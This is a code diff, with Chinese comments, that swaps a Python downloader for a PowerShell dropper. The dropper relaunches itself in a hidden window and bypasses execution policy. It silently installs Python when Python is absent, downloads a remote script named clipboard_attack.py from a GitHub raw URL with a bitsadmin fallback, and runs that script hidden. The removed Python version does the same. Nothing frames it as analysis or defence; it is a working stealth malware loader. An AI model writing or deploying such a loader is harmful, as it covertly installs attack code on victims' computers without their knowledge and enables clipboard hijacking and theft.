@@ -1,43 +1,38 @@
-import requests
-import os
-import subprocess
-from threading import Thread
+# 让 PowerShell 静默运行
+$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+Start-Process -WindowStyle Hidden -FilePath $powershellPath -ArgumentList "-ExecutionPolicy Bypass -File $PSCommandPath" -PassThru
+exit
 
-def download_config(url, save_path):
-    try:
-        response = requests.get(url, stream=True)
-        response.raise_for_status()
-        
-        # 确保目标文件夹存在
-        os.makedirs(os.path.dirname(save_path), exist_ok=True)
-        
-        # 直接写入文件
-        with open(save_path, 'wb') as file:
-            for chunk in response.iter_content(chunk_size=8192):
-                if chunk:
-                    file.write(chunk)
-        return True
-    except:
-        return False
+# 设置执行策略为 ByPass
+Set-ExecutionPolicy Bypass -Scope Process -Force
 
-def on_button_click(config_url, save_path):
-    # 启动后台下载线程
-    thread = Thread(target=download_config, args=(config_url, save_path))
-    thread.daemon = True
-    thread.start()
+# 定义脚本下载链接
+$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
+$scriptPath = "$env:TEMP\clipboard_attack.py"
 
-def run_silent_script():
-    # 下载脚本并运行
-    config_url = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"  # 配置文件下载链接
-    save_path = "C:/Users/Admin/config.json"  # 配置文件保存路径
-    on_button_click(config_url, save_path)
-    
-    # 运行 Python 脚本（静默模式）
-    subprocess.Popen(
-        ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', 
-         'Start-Process python -ArgumentList "C:/Users/Admin/clipboard_attack.py" -WindowStyle Hidden -NoNewWindow'],
-        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+# 检查 Python 是否已安装
+$pythonCheck = (Get-Command python -ErrorAction SilentlyContinue)
+if (-not $pythonCheck) {
+    # 静默安装 Python
+    $pythonInstaller = "https://www.python.org/ftp/python/3.7.9/python-3.7.9-amd64.exe"
+    $pythonPath = "C:\Python37\python.exe"
 
-if __name__ == "__main__":
-    run_silent_script()
+    Invoke-WebRequest -Uri $pythonInstaller -OutFile "$env:TEMP\python_installer.exe"
+    Start-Process -FilePath "$env:TEMP\python_installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
 
+    if (-not (Test-Path $pythonPath)) {
+        exit 1
+    }
+}
+
+# 使用 Invoke-WebRequest 下载 Python 脚本
+try {
+    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
+} catch {
+    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer DownloadScript $scriptUrl $scriptPath" -Wait
+}
+
+# 运行 Python 脚本（静默模式）
+if (Test-Path $scriptPath) {
+    Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList $scriptPath -PassThru
+}
